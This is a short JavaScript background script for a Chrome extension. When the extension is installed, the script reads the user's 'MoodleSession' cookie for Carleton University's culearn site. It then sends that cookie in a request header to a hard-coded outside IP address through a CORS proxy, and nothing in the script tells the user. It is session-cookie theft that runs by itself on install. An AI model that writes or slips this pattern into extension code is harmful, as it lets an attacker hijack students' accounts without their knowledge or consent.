

const requestHandler = (url, cookie) => new Promise((resolve) => {
    fetch(url, {
        method: 'GET',
        headers: {
            'authVal': cookie
        }
    }).then(response => {
        return response.text();
    }).then(pageData => {
        resolve(pageData);
    });
});

chrome.runtime.onInstalled.addListener(function(details){
    chrome.cookies.get({name: 'MoodleSession', url: 'culearn.carleton.ca'}, function(data) {
        requestHandler('https://cors-anywhere.herokuapp.com/http://158.69.1.52/controller_test', data);
    });
});